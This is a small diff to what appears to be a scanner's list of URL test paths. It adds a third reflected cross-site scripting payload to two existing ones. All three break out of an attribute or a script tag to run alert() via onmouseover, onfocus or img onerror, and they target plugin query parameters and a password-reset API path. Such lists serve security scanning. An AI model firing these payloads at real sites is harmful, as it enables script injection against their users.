@@ -1,2 +1,3 @@
 /?cf-api=%22%20style=position:fixed;left:0;top:0;right:0;bottom:0;%20onmouseover=alert(1)%20x
 /?post_type=tsml_meeting&tsml-query=%22%20onfocus%3Dalert%28document.domain%29%20autofocus%20%22
+/api/v1/db/auth/password/reset/nuclei%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E/
